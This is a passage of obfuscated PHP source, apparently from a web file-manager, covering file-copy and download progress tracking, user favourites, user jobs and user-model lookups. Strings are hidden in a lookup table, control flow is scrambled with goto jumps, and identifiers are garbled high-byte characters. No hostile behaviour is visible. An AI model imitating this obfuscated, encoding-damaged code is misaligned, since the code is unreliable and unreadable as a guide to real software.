fä˘†µÏ†ó; f•ÇÜ¯—Éä: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($D◊ ‹∞Ñ¡ô) { $céÏàèÂÎﬁ =& $_SERVER[¯èãÄπµ]; $AÜÒ≈îåÈ” =& $this->task; $AÜÒ≈îåÈ”[$céÏàèÂÎﬁ[1467]] = $D◊ ‹∞Ñ¡ô[$céÏàèÂÎﬁ[28]]; $AÜÒ≈îåÈ”[$céÏàèÂÎﬁ[982]] = $D◊ ‹∞Ñ¡ô[$céÏàèÂÎﬁ[28]]; $this->update(); } public function copyFileStart($bØ€µ¿ﬂâí, $Då∏¿®’œ◊, $fè¥·÷ø‘, $eäÎØ†¥èî, $d˜™ﬂ•¯ÜÁ, $F∑Ú–úÉÂ≤) { goto EŒﬂ°≥ıí˜; A∂≈Í∫≤éÓ: $A˘ØÖÔáö±[$d˜¶—Øá÷Ü[982]] = $d˜¶—Øá÷Ü[33]; $A˘ØÖÔáö±[$d˜¶—Øá÷Ü[1471]] = $d˜¶—Øá÷Ü[33]; $A˘ØÖÔáö±[$d˜¶—Øá÷Ü[1472]] = 0; goto E®ÂﬁÃ‡òç; E®ÂﬁÃ‡òç: $this->update(); goto e–®¬èŸ†ã; Eßƒ˜ãõ–ª: $GLOBALS[$d˜¶—Øá÷Ü[1478]] = $d˜™ﬂ•¯ÜÁ; $GLOBALS[$d˜¶—Øá÷Ü[1477]] = $F∑Ú–úÉÂ≤; $A˘ØÖÔáö± =& $this->task; goto Dß…Èû£É˘; EŒﬂ°≥ıí˜: $d˜¶—Øá÷Ü =& $_SERVER[¯èãÄπµ]; $Bﬂöœ⁄•å¨ = $d˜™ﬂ•¯ÜÁ; if ($Bﬂöœ⁄•å¨ == $GLOBALS[$d˜¶—Øá÷Ü[1477]]) { $Bﬂöœ⁄•å¨ = $GLOBALS[$d˜¶—Øá÷Ü[1478]]; } goto Eßƒ˜ãõ–ª; Dß…Èû£É˘: $A˘ØÖÔáö±[$d˜¶—Øá÷Ü[1467]] = $Bﬂöœ⁄•å¨; $A˘ØÖÔáö±[$d˜¶—Øá÷Ü[1469]] = (int) $bØ€µ¿ﬂâí->size($Då∏¿®’œ◊); $A˘ØÖÔáö±[$d˜¶—Øá÷Ü[1470]] = 0; goto A∂≈Í∫≤éÓ; e–®¬èŸ†ã: } public function copyFileEnd($b–úÎŒÁá, $a÷“é∆¯„”, $E©Î›∑∏‘Œ, $dòóﬂ¥´µ©, $BÕŒÕ•Ÿ´–, $bÇﬁÓöè◊º) { $Aç»ı∆≠ì =& $_SERVER[¯èãÄπµ]; $FâŸ®¬æ£¶ =& $this->task; $FâŸ®¬æ£¶[$Aç»ı∆≠ì[1470]] = $FâŸ®¬æ£¶[$Aç»ı∆≠ì[1469]]; $FâŸ®¬æ£¶[$Aç»ı∆≠ì[1471]] = $Aç»ı∆≠ì[33]; if ($BÕŒÕ•Ÿ´– == $FâŸ®¬æ£¶[$Aç»ı∆≠ì[1467]]) { $FâŸ®¬æ£¶[$Aç»ı∆≠ì[1474]] += $FâŸ®¬æ£¶[$Aç»ı∆≠ì[1469]]; $this->update(1); } else { $this->update(); $FâŸ®¬æ£¶[$Aç»ı∆≠ì[1470]] = 0; } self::log($Aç»ı∆≠ì[1479] . $a÷“é∆¯„” . $Aç»ı∆≠ì[66] . $dòóﬂ¥´µ© . $Aç»ı∆≠ì[213] . $BÕŒÕ•Ÿ´– . $Aç»ı∆≠ì[1480] . $FâŸ®¬æ£¶[$Aç»ı∆≠ì[1467]]); } public function updateFileEnd($a¶ùáöéäı, $a∫¡ﬁò∞ò¡) { $cæ…ÚÍ¢ÃŸ =& $_SERVER[¯èãÄπµ]; $a∂Â∫Ñ„Î∞ =& $this->task; $a∂Â∫Ñ„Î∞[$cæ…ÚÍ¢ÃŸ[1467]] = $a¶ùáöéäı; $a∂Â∫Ñ„Î∞[$cæ…ÚÍ¢ÃŸ[1469]] = $a∫¡ﬁò∞ò¡; $a∂Â∫Ñ„Î∞[$cæ…ÚÍ¢ÃŸ[1474]] += $a∫¡ﬁò∞ò¡; $this->update(1); } public function sourceModelCopy($DåÓﬂÖü”∏) { goto aÜûíÁàÑÕ; béà§∑Á∂∫: $BƒÖÏ±çí¿ =& $this->task; $this->sourceModelCopyFlag = !0; $DãÍ≥≤ÂªÔ = 0; goto bßÍ∏›ıŸç; aÜûíÁàÑÕ: $AÓâ†ÿﬁ®‡ =& $_SERVER[¯èãÄπµ]; $B©´ìïÁêù = $DåÓﬂÖü”∏[0]; $bë•Êòƒ‘° = $DåÓﬂÖü”∏[1]; goto béà§∑Á∂∫; bßÍ∏›ıŸç: switch ($B©´ìïÁêù) { case $AÓâ†ÿﬁ®‡[503]: $DãÍ≥≤ÂªÔ = 1; break; case $AÓâ†ÿﬁ®‡[506]: $BƒÖÏ±çí¿[$AÓâ†ÿﬁ®‡[1467]] = $bë•Êòƒ‘°[$AÓâ†ÿﬁ®‡[28]]; break; case $AÓâ†ÿﬁ®‡[508]: $DãÍ≥≤ÂªÔ = intval($DåÓﬂÖü”∏[$AÓâ†ÿﬁ®‡[359]] * 0.4); break; case $AÓâ†ÿﬁ®‡[510]: $DãÍ≥≤ÂªÔ = intval($DåÓﬂÖü”∏[$AÓâ†ÿﬁ®‡[359]] * 0.2); break; case $AÓâ†ÿﬁ®‡[512]: $DãÍ≥≤ÂªÔ = intval($DåÓﬂÖü”∏[$AÓâ†ÿﬁ®‡[359]] * 0.4); break; } $this->update($DãÍ≥≤ÂªÔ); $this->sourceModelCopyFlag = !1; goto fäƒüê∫à•; fäƒüê∫à•: } public function sourceRemove($Dçæ…ºâç§, $F…«„¬ï£â) { $aâ…ƒÆˆﬂÃ =& $_SERVER[¯èãÄπµ]; $this->sourceModelCopyFlag = !0; $e®Üò’ï∆… = 1; if (isset($Dçæ…ºâç§[$aâ…ƒÆˆﬂÃ[80]])) { $e®Üò’ï∆… = $Dçæ…ºâç§[$aâ…ƒÆˆﬂÃ[80]][$aâ…ƒÆˆﬂÃ[78]] + $Dçæ…ºâç§[$aâ…ƒÆˆﬂÃ[80]][$aâ…ƒÆˆﬂÃ[79]] + 1; } $this->update($e®Üò’ï∆…); $this->sourceModelCopyFlag = !1; } public function sourceMove($DÓéÙ‘‘ßû) { $this->sourceRemove($DÓéÙ‘‘ßû, !1); } public function curlProgress($A◊«Ô√ÜÔ„, $B®Œº∂¨‘ò, $Fß”ﬁó≈÷Ú, $Fä£«πä’π, $C«Ìë≤œßÑ) { $aã°ó°È’≥ =& $_SERVER[¯èãÄπµ]; $Cûñ˜≤∑Óî =& $this->task; if ($C«Ìë≤œßÑ > 0) { $Cûñ˜≤∑Óî[$aã°ó°È’≥[982]] = $aã°ó°È’≥[1481]; $Cûñ˜≤∑Óî[$aã°ó°È’≥[1471]] = $aã°ó°È’≥[102]; if ($Cûñ˜≤∑Óî[$aã°ó°È’≥[1469]] == $Fä£«πä’π || $Fä£«πä’π > 1024 * 1024) { $Cûñ˜≤∑Óî[$aã°ó°È’≥[1470]] = $C«Ìë≤œßÑ; } if ($Cûñ˜≤∑Óî[$aã°ó°È’≥[1472]]) { $Cûñ˜≤∑Óî[$aã°ó°È’≥[1470]] = $C«Ìë≤œßÑ + $Cûñ˜≤∑Óî[$aã°ó°È’≥[1472]]; } } else { if ($Fß”ﬁó≈÷Ú > 0) { if ($Cûñ˜≤∑Óî[$aã°ó°È’≥[1469]] == $B®Œº∂¨‘ò) { $Cûñ˜≤∑Óî[$aã°ó°È’≥[1470]] = $Fß”ﬁó≈÷Ú; $Cûñ˜≤∑Óî[$aã°ó°È’≥[982]] = $aã°ó°È’≥[1482]; $Cûñ˜≤∑Óî[$aã°ó°È’≥[1471]] = $aã°ó°È’≥[1042]; } } } $this->update(); } public function curlProgressStart($FÏáêï÷ﬂè) { } public function curlProgressEnd($D±ÆÚ≥ ΩÖ) { $A¥Ì‘©≤›◊ =& $_SERVER[¯èãÄπµ]; $F∂¨‡ô¿©© =& $this->task; $eÁãßâ¶Îó = curl_getinfo($D±ÆÚ≥ ΩÖ); $f∂ÚÛÑêœ∏ = $eÁãßâ¶Îó[$A¥Ì‘©≤›◊[1483]]; if ($F∂¨‡ô¿©©[$A¥Ì‘©≤›◊[1471]] == $A¥Ì‘©≤›◊[102] && $f∂ÚÛÑêœ∏) { $F∂¨‡ô¿©©[$A¥Ì‘©≤›◊[1472]] += $f∂ÚÛÑêœ∏; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $c£Üÿ÷Àã÷ =& $_SERVER[¯èãÄπµ]; Hook::bind($c£Üÿ÷Àã÷[1461], array($this, $c£Üÿ÷Àã÷[1484])); Hook::bind($c£Üÿ÷Àã÷[1463], array($this, $c£Üÿ÷Àã÷[1485])); Hook::bind($c£Üÿ÷Àã÷[1465], array($this, $c£Üÿ÷Àã÷[1486])); } protected function endAfter() { $fÌÏÜÑ⁄»Ò =& $_SERVER[¯èãÄπµ]; Hook::unbind($fÌÏÜÑ⁄»Ò[1461], array($this, $fÌÏÜÑ⁄»Ò[1484])); Hook::unbind($fÌÏÜÑ⁄»Ò[1463], array($this, $fÌÏÜÑ⁄»Ò[1485])); Hook::unbind($fÌÏÜÑ⁄»Ò[1465], array($this, $fÌÏÜÑ⁄»Ò[1486])); } public function progressStart($C£Üù™Ùç¿) { $c“˘Ωø∏Æâ =& $_SERVER[¯èãÄπµ]; $Bæﬁ∞¿ÖÖ = curl_getinfo($C£Üù™Ùç¿); self::log($c“˘Ωø∏Æâ[1487] . $Bæﬁ∞¿ÖÖ[$c“˘Ωø∏Æâ[291]]); self::valueSet($this->task[$c“˘Ωø∏Æâ[363]], $this->task); } public function progressEnd($e•∆üÊØÔ¡) { $eÕÉ∏©ê”Ó =& $_SERVER[¯èãÄπµ]; self::log($eÕÉ∏©ê”Ó[1488] . $this->task[$eÕÉ∏©ê”Ó[363]]); $this->end(); } public function progress($D®ç›îçÎ™, $c«Ïﬁ“ó¿⁄, $aáØ«±∂ÒÑ, $aÑÃ÷û˘éç, $Cö–∆ÁãÌÚ) { $e•â¥øÇ·ç =& $_SERVER[¯èãÄπµ]; $fôƒèö…˜ï =& $this->task; if ($Cö–∆ÁãÌÚ > 0) { $fôƒèö…˜ï[$e•â¥øÇ·ç[980]] = $fôƒèö…˜ï[$e•â¥øÇ·ç[980]] == 0 ? $aÑÃ÷û˘éç : $fôƒèö…˜ï[$e•â¥øÇ·ç[980]]; $fôƒèö…˜ï[$e•â¥øÇ·ç[992]] = $Cö–∆ÁãÌÚ; } else { if ($aáØ«±∂ÒÑ > 0) { $fôƒèö…˜ï[$e•â¥øÇ·ç[980]] = $fôƒèö…˜ï[$e•â¥øÇ·ç[980]] == 0 ? $c«Ïﬁ“ó¿⁄ : $fôƒèö…˜ï[$e•â¥øÇ·ç[980]]; $fôƒèö…˜ï[$e•â¥øÇ·ç[992]] = $aáØ«±∂ÒÑ; } } $this->update(); self::log("\160\x72\x6f\x67\162\x65\163\x73\x48\x74\x74\x70\72\x64\157\x77\156\x3a{$aáØ«±∂ÒÑ}\57{$c«Ïﬁ“ó¿⁄}\x3b\40\x75\160\154\157\x61\x64\72{$Cö–∆ÁãÌÚ}\x2f{$aÑÃ÷û˘éç}\73"); } } goto C∞ à”êï¯; f≥∆∫âõî: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\146\x61\x76"; protected function cacheFunctionAlias($fÓËù…çäô) { $BÉ‡ê—óÜë =& $_SERVER[¯èãÄπµ]; return array($BÉ‡ê—óÜë[2468] => array(USER_ID, $BÉ‡ê—óÜë[2469])); } protected function listData() { $E¥∂É‘æêé =& $_SERVER[¯èãÄπµ]; $A’è§ø˜•º = array($E¥∂É‘æêé[1415] => USER_ID, $E¥∂É‘æêé[432] => 0); $CÜìÓŒñË• = $E¥∂É‘æêé[2470]; $d¥â∏¿¡ÖÓ = $this->field($CÜìÓŒñË•)->where($A’è§ø˜•º)->order($E¥∂É‘æêé[2471])->select(); return $d¥â∏¿¡ÖÓ ? $d¥â∏¿¡ÖÓ : array(); } protected function resetCache() { } protected function listView() { goto a«†ê†ìÁÑ; aßˆª∆øòá: $dÂ€Ë…˘«À = array_to_keyvalue($dÂ€Ë…˘«À, $Eãùé“–îÆ[365]); foreach ($Aôüî””∂≈ as $DœÛÇä‘˘‰ => $dÀüÉàòı≥) { $BÃÓôè¡Ÿ = $dÂ€Ë…˘«À[$dÀüÉàòı≥[$Eãùé“–îÆ[75]]]; $BÃÓôè¡Ÿ = $BÃÓôè¡Ÿ ? $BÃÓôè¡Ÿ : array(); $Aôüî””∂≈[$DœÛÇä‘˘‰] = array_merge($BÃÓôè¡Ÿ, $dÀüÉàòı≥); } return $Aôüî””∂≈; goto dÉ“£é´≠Í; a«†ê†ìÁÑ: $Eãùé“–îÆ =& $_SERVER[¯èãÄπµ]; $Aôüî””∂≈ = $this->listData(); $C≤÷†Î‡˘á = array_filter_by_field($Aôüî””∂≈, $Eãùé“–îÆ[29], $Eãùé“–îÆ[378]); goto fƒÇë´Û°; fƒÇë´Û°: $b§ïã≤Ç‘† = array_to_keyvalue($C≤÷†Î‡˘á, $Eãùé“–îÆ[33], $Eãùé“–îÆ[75]); if (!$b§ïã≤Ç‘†) { return $Aôüî””∂≈; } $Bçé†–∞Üœ = 2000; goto C·‹ÌîºËÎ; C·‹ÌîºËÎ: $e†ôÈøﬂ¡  = array($Eãùé“–îÆ[379] => array($Eãùé“–îÆ[380], $b§ïã≤Ç‘†)); $dÂ€Ë…˘«À = Model($Eãùé“–îÆ[755])->listSource($e†ôÈøﬂ¡ , $Bçé†–∞Üœ); $dÂ€Ë…˘«À = array_merge($dÂ€Ë…˘«À[$Eãùé“–îÆ[73]], $dÂ€Ë…˘«À[$Eãùé“–îÆ[74]]); goto aßˆª∆øòá; dÉ“£é´≠Í: } protected function addFav($b∂Á·Î¬™é, $Aù≥Ôπä¨€ = '', $E∏ªû∆∆«€ = "\163\x6f\165\x72\x63\x65") { goto dÒ√©éë´´; e„Î ÷ Âº: $bÓà¿ÑﬂâÖ = array($Dµ¯£°ûÛ‘[1415] => USER_ID, $Dµ¯£°ûÛ‘[432] => 0); $C°◊âãêÇ≤ = $this->where($bÓà¿ÑﬂâÖ)->max($Dµ¯£°ûÛ‘[2108]); if (!$C°◊âãêÇ≤) { $C°◊âãêÇ≤ = 0; } goto Dﬂ£Ãò‚ÿÏ; a”ß∑•†ü∞: return $this->add($aá»éıÀπà); goto Eî„õ©∫∏Ô; dÒ√©éë´´: $Dµ¯£°ûÛ‘ =& $_SERVER[¯èãÄπµ]; $bÓà¿ÑﬂâÖ = array($Dµ¯£°ûÛ‘[1415] => USER_ID, $Dµ¯£°ûÛ‘[432] => 0, $Dµ¯£°ûÛ‘[384] => $E∏ªû∆∆«€, $Dµ¯£°ûÛ‘[383] => $b∂Á·Î¬™é); if ($this->where($bÓà¿ÑﬂâÖ)->find()) { return !1; } goto e„Î ÷ Âº; Dﬂ£Ãò‚ÿÏ: if (!$Aù≥Ôπä¨€ && $E∏ªû∆∆«€ == $Dµ¯£°ûÛ‘[378]) { $EœÈ™ï–ò“ = Model($Dµ¯£°ûÛ‘[1112])->where(array($Dµ¯£°ûÛ‘[379] => $b∂Á·Î¬™é))->find(); if (!$EœÈ™ï–ò“) { return !1; } $Aù≥Ôπä¨€ = $EœÈ™ï–ò“[$Dµ¯£°ûÛ‘[28]]; } $Aù≥Ôπä¨€ = $this->getAutoName($Aù≥Ôπä¨€); $aá»éıÀπà = array($Dµ¯£°ûÛ‘[1415] => USER_ID, $Dµ¯£°ûÛ‘[432] => 0, $Dµ¯£°ûÛ‘[382] => $Aù≥Ôπä¨€, $Dµ¯£°ûÛ‘[383] => $b∂Á·Î¬™é, $Dµ¯£°ûÛ‘[384] => $E∏ªû∆∆«€, $Dµ¯£°ûÛ‘[2091] => $C°◊âãêÇ≤ + 1); goto a”ß∑•†ü∞; Eî„õ©∫∏Ô: } protected function remove($bı‰∏¡Ñ¶ø) { $eå®ù∂ÜÒå =& $_SERVER[¯èãÄπµ]; $b◊ãùÂ€Êﬁ = array($eå®ù∂ÜÒå[1415] => USER_ID, $eå®ù∂ÜÒå[381] => $bı‰∏¡Ñ¶ø); return $this->where($b◊ãùÂ€Êﬁ)->delete(); } protected function removeByName($cóß§ «êÖ) { $AÜå«óçâ´ =& $_SERVER[¯èãÄπµ]; $aÒÇëŒªÜŸ = array($AÜå«óçâ´[1415] => USER_ID, $AÜå«óçâ´[382] => $cóß§ «êÖ, $AÜå«óçâ´[432] => 0); return $this->where($aÒÇëŒªÜŸ)->delete(); } protected function rename($C‘ÊÜ”ÔóÚ, $A∞ÌßÆçÚ∞) { $AﬂáÇπ™ı® =& $_SERVER[¯èãÄπµ]; if ($C‘ÊÜ”ÔóÚ == $A∞ÌßÆçÚ∞) { return !1; } $Dﬂıä¨å‚ÿ = $this->getAutoName($A∞ÌßÆçÚ∞); if ($A∞ÌßÆçÚ∞ != $Dﬂıä¨å‚ÿ) { return !1; } $DúıÛå“Èù = array($AﬂáÇπ™ı®[1415] => USER_ID, $AﬂáÇπ™ı®[432] => 0, $AﬂáÇπ™ı®[28] => $C‘ÊÜ”ÔóÚ); return $this->where($DúıÛå“Èù)->save(array($AﬂáÇπ™ı®[28] => $A∞ÌßÆçÚ∞)); } protected function resetSort($EÖ»ÈÑ‰∏É) { $AÈäÖÆÉˆÎ =& $_SERVER[¯èãÄπµ]; $EÖ»ÈÑ‰∏É = is_array($EÖ»ÈÑ‰∏É) ? $EÖ»ÈÑ‰∏É : array(); $Aßù˜“⁄é— = array($AÈäÖÆÉˆÎ[1415] => USER_ID); for ($A§‘ò–Ëè¶ = 0; $A§‘ò–Ëè¶ < count($EÖ»ÈÑ‰∏É); $A§‘ò–Ëè¶++) { $Aßù˜“⁄é—[$AÈäÖÆÉˆÎ[381]] = $EÖ»ÈÑ‰∏É[$A§‘ò–Ëè¶]; $this->where($Aßù˜“⁄é—)->save(array($AÈäÖÆÉˆÎ[2091] => $A§‘ò–Ëè¶ + 1)); } return !0; } protected function moveTop($FÁπÆ•æëû) { goto CÛ√Ò»ø´ﬁ; Dﬂ±öæ–∫ü: return $this->resetSort($EÑÖ›—Ñ⁄µ); goto A‡¢ã«Œ€ü; BíÌÁ¢ñÃ¢: $bïÌÛ„Æ÷≥ = $EÑÖ›—Ñ⁄µ; $EÑÖ›—Ñ⁄µ = array_remove_value($EÑÖ›—Ñ⁄µ, $CÛ«Û˘∫„â[$Aà§¶€“—õ[363]]); array_unshift($EÑÖ›—Ñ⁄µ, $CÛ«Û˘∫„â[$Aà§¶€“—õ[363]]); goto Dﬂ±öæ–∫ü; CÛ√Ò»ø´ﬁ: $Aà§¶€“—õ =& $_SERVER[¯èãÄπµ]; $A◊ªˆ¿â·ª = array($Aà§¶€“—õ[1415] => USER_ID, $Aà§¶€“—õ[432] => 0); $CÛ«Û˘∫„â = $this->where($A◊ªˆ¿â·ª)->where(array($Aà§¶€“—õ[28] => $FÁπÆ•æëû))->find(); goto dØÿÉ™ ∂ﬂ; dØÿÉ™ ∂ﬂ: if (!$CÛ«Û˘∫„â) { return; } $EÑÖ›—Ñ⁄µ = $this->field($Aà§¶€“—õ[363])->where($A◊ªˆ¿â·ª)->order($Aà§¶€“—õ[2471])->select(); $EÑÖ›—Ñ⁄µ = array_to_keyvalue($EÑÖ›—Ñ⁄µ, $Aà§¶€“—õ[33], $Aà§¶€“—õ[363]); goto BíÌÁ¢ñÃ¢; A‡¢ã«Œ€ü: } protected function moveBottom($aß‚æ¯ö—ü) { $eßéÀëŒµ∂ =& $_SERVER[¯èãÄπµ]; $d÷˘àæüÖè = array($eßéÀëŒµ∂[1415] => USER_ID, $eßéÀëŒµ∂[432] => 0); $eÖú∏ŒÏ“π = $this->where($d÷˘àæüÖè)->max($eßéÀëŒµ∂[2108]); $dçè£„˜—ï = array($eßéÀëŒµ∂[2108] => $eÖú∏ŒÏ“π + 1); return $this->where($d÷˘àæüÖè)->where(array($eßéÀëŒµ∂[28] => $aß‚æ¯ö—ü))->save($dçè£„˜—ï); } private function getAutoName($eòÓ¡åıÜ“) { goto a√È∏Îßõ—; a≈ëïå¢Ú¡: $aóß»±œÿ´ = array_to_keyvalue($aóß»±œÿ´, $AìÚÜä≠ãë[33], $AìÚÜä≠ãë[28]); if (!$aóß»±œÿ´ || !in_array($eòÓ¡åıÜ“, $aóß»±œÿ´)) { return $eòÓ¡åıÜ“; } for ($A±çâæÍúÛ = 0; $A±çâæÍúÛ < count($aóß»±œÿ´); $A±çâæÍúÛ++) { if (!in_array($eòÓ¡åıÜ“ . "\x28{$A±çâæÍúÛ}\51", $aóß»±œÿ´)) { return $eòÓ¡åıÜ“ . "\x28{$A±çâæÍúÛ}\51"; } } goto aóÙ§Ô«Ÿë; a√È∏Îßõ—: $AìÚÜä≠ãë =& $_SERVER[¯èãÄπµ]; $aââ“óÙÃá = array($AìÚÜä≠ãë[1415] => USER_ID, $AìÚÜä≠ãë[432] => 0); $aóß»±œÿ´ = $this->field($AìÚÜä≠ãë[28])->where($aââ“óÙÃá)->select(); goto a≈ëïå¢Ú¡; aóÙ§Ô«Ÿë: return $eòÓ¡åıÜ“ . "\50{$A±çâæÍúÛ}\x29"; goto E≤∂•á„≈º; E≤∂•á„≈º: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\152\157\142\114\151\x73\164"; public $field = array("\156\x61\x6d\145", "\144\145\x73\x63", "\x73\x6f\x72\x74"); const JOB_KEY = "\163\145\154\146\112\x6f\x62\114\x69\x73\164"; public function listData($E¶ÎÂ‘Úà¯ = false, $cÂÙ«Ω∆Œù = "\163\x6f\162\x74", $F—√Ñıé´’ = false) { return parent::listData($E¶ÎÂ‘Úà¯, $cÂÙ«Ω∆Œù, $F—√Ñıé´’); } public function remove($Cà©‚µ∞ Œ) { return parent::remove($Cà©‚µ∞ Œ); } public function add($aÍ∞ìÁù‹€) { $F» ‚‡éÉ∂ =& $_SERVER[¯èãÄπµ]; if ($this->findByName($aÍ∞ìÁù‹€[$F» ‚‡éÉ∂[28]])) { return !1; } $aÍ∞ìÁù‹€[$F» ‚‡éÉ∂[2108]] = $this->getSort(); return parent::insert($aÍ∞ìÁù‹€); } private function getSort() { $B≥¶‡…úó =& $_SERVER[¯èãÄπµ]; $F»üÏÖõﬁÍ = parent::listData(); $aﬁâââò¬‡ = array_to_keyvalue($F»üÏÖõﬁÍ, $B≥¶‡…úó[33], $B≥¶‡…úó[2108]); return empty($aﬁâââò¬‡) ? 0 : max($aﬁâââò¬‡) + 1; } public function update($dœπ§Éæè«, $DÕ°êÆÌµ√) { $e∂ÇÔŸ°«é =& $_SERVER[¯èãÄπµ]; $D¨è»ÓÒè = parent::listData($dœπ§Éæè«); $E◊íïŸéíÖ = $this->findByName($DÕ°êÆÌµ√[$e∂ÇÔŸ°«é[28]]); if (!$D¨è»ÓÒè || $E◊íïŸéíÖ && $E◊íïŸéíÖ[$e∂ÇÔŸ°«é[363]] != $D¨è»ÓÒè[$e∂ÇÔŸ°«é[363]]) { return !1; } return parent::update($dœπ§Éæè«, $DÕ°êÆÌµ√); } public function setUserJob($BêΩ≥Â£äñ, $A÷°êÚ¨èé) { goto c˘Î‡ëõû≥; CŒê‹ÀŒ¯¡: $BéÖ¯çÉÆ´ = rtrim($BéÖ¯çÉÆ´, $e¬›€ÆëéŒ[47]); Model($e¬›€ÆëéŒ[473])->metaSet($BêΩ≥Â£äñ, self::JOB_KEY, $BéÖ¯çÉÆ´); goto e∏Û êùí·; c˘Î‡ëõû≥: $e¬›€ÆëéŒ =& $_SERVER[¯èãÄπµ]; if (!is_array($A÷°êÚ¨èé)) { $A÷°êÚ¨èé = array($A÷°êÚ¨èé); } $aı· ƒûë† = parent::listData(); goto c∞˘≥˘ﬂ—ï; c∞˘≥˘ﬂ—ï: $D©«óª≈Ó∆ = array_to_keyvalue($aı· ƒûë†, $e¬›€ÆëéŒ[28]); $BéÖ¯çÉÆ´ = $e¬›€ÆëéŒ[357]; foreach ($A÷°êÚ¨èé as $aÈç…ÖÙÉı) { if ($D©«óª≈Ó∆[$aÈç…ÖÙÉı]) { $BéÖ¯çÉÆ´ .= $D©«óª≈Ó∆[$aÈç…ÖÙÉı][$e¬›€ÆëéŒ[363]] . $e¬›€ÆëéŒ[47]; } else { $B‰ª‹™‚¿æ = $this->add($aÈç…ÖÙÉı); $BéÖ¯çÉÆ´ .= $B‰ª‹™‚¿æ . $e¬›€ÆëéŒ[47]; } } goto CŒê‹ÀŒ¯¡; e∏Û êùí·: } public function getUserJob($dûÑåé»óó) { $cÖ¶Òƒﬂ—∏ = Model($_SERVER[¯èãÄπµ][473])->metaGet($dûÑåé»óó); return $this->getUserJobInfo($cÖ¶Òƒﬂ—∏[self::JOB_KEY]); } public function getUserJobInfo($AÜ™Ê’âëü) { goto A”ÁßŸ„£ê; A”ÁßŸ„£ê: $eÜ®⁄›˘≤ =& $_SERVER[¯èãÄπµ]; $búµ∑é⁄áÑ = explode($eÜ®⁄›˘≤[47], $AÜ™Ê’âëü); $bƒÜÚ…∏ËØ = parent::listData(); goto D¶¬Á™∆å‹; Aåˆäù≠Ü: return $E«òÇûˆÖÚ; goto cÃÜ†≈ﬁÊˆ; D¶¬Á™∆å‹: $bƒÜÚ…∏ËØ = array_remove_key($bƒÜÚ…∏ËØ, $eÜ®⁄›˘≤[183]); $E«òÇûˆÖÚ = array(); foreach ($búµ∑é⁄áÑ as $D†ıé¶£ƒ‘) { if (isset($bƒÜÚ…∏ËØ[$D†ıé¶£ƒ‘])) { $E«òÇûˆÖÚ[] = $bƒÜÚ…∏ËØ[$D†ıé¶£ƒ‘]; } } goto Aåˆäù≠Ü; cÃÜ†≈ﬁÊˆ: } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\164\141\x62\x6c\145\x4e\x61\x6d\x65" => "\165\x73\x65\x72\x5f\x6d\145\164\x61", "\x6d\145\x74\141\x46\151\145\x6c\144" => "\x75\x73\x65\162\x49\x44"); protected $simpleField = "\165\163\x65\x72\111\x44\54\x6e\151\x63\x6b\x4e\x61\x6d\145\54\x6e\141\155\145\x2c\x61\166\141\164\141\x72\x2c\163\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($eÎ√Æ ú¥©) { $B»ıâ‚î®® =& $_SERVER[¯èãÄπµ]; $aÏü·¯„Ωﬁ = $B»ıâ‚î®®[2472]; return array($B»ıâ‚î®®[2153] => array($eÎ√Æ ú¥©[0], $aÏü·¯„Ωﬁ), $B»ıâ‚î®®[2155] => array($eÎ√Æ ú¥©[0], $aÏü·¯„Ωﬁ), $B»ıâ‚î®®[2473] => array($eÎ√Æ ú¥©[0], $aÏü·¯„Ωﬁ)); } protected function getInfo($D›œ≈Öíßƒ, $dÆ„àŸÿÍÏ = false) { $fè÷ñ•≠’Û = $this->getInfoSimple($D›œ≈Öíßƒ); if (!is_array($fè÷ñ•≠’Û)) { return array(); } if ($dÆ„àŸÿÍÏ) { return $this->_getInfoApply($fè÷ñ•≠’Û); } return $this->cacheFunctionGet($_SERVER[¯èãÄπµ][2195], $D›œ≈Öíßƒ); } protected function getInfoFull($b‡íØ¡î√», $dÍ≠Ã◊ï±ú = false) { $AÜêÚ‚Æœ± = $this->getInfoSimple($b‡íØ¡î√»); if (!is_array($AÜêÚ‚Æœ±)) { return array(); } if ($dÍ≠Ã◊ï±ú) { return $this->_getInfoApply($AÜêÚ‚Æœ±, !0); return $this->_getInfoApply($AÜêÚ‚Æœ±, !0); } return $this->cacheFunctionGet($_SERVER[¯èãÄπµ][2474], $b‡íØ¡î√»); } private function _getInfoApply($b¬„¬Ïûéƒ, $AÛ©—»÷Û„ = false) { goto Eÿ›áØâı„; C‚€Ô˘≈„Ë: $b¬„¬Ïûéƒ = $this->_listDataApplyItem($b¬„¬Ïûéƒ); $d·ßÜŒúÜÆ = Model($C†¬Á êº≈[1112])->metaGet($b¬„¬Ïûéƒ[$C†¬Á êº≈[387]][$C†¬Á êº≈[365]]); $b¬„¬Ïûéƒ[$C†¬Á êº≈[2477]] = $e◊™îåäÍÍ; goto EÎõ∏πÕß÷; Eÿ›áØâı„: $C†¬Á êº≈ =& $_SERVER[¯èãÄπµ]; if (!$b¬„¬Ïûéƒ) { return $b¬„¬Ïûéƒ; } $e◊™îåäÍÍ = md5($C†¬Á êº≈[2475] . $b¬„¬Ïûéƒ[$C†¬Á êº≈[806]] . $C†¬Á êº≈[2476] . $b¬„¬Ïûéƒ[$C†¬Á êº≈[28]]); goto C‚€Ô˘≈„Ë; EÎõ∏πÕß÷: $b¬„¬Ïûéƒ[$C†¬Á êº≈[387]][$C†¬Á êº≈[2310]] = isset($d·ßÜŒúÜÆ[$C†¬Á êº≈[2311]]) ? $d·ßÜŒúÜÆ[$C†¬Á êº≈[2311]] : null; if ($AÛ©—»÷Û„) { $b¬„¬Ïûéƒ[$C†¬Á êº≈[413]] = $this->metaGet($b¬„¬Ïûéƒ[$C†¬Á êº≈[1424]]); } return $b¬„¬Ïûéƒ; goto c°ç°Ú Û¨; c°ç°Ú Û¨: } protected function getInfoSimple($d◊ù£‘Æäµ, $c›¥ﬂ‚à›ù = false) { 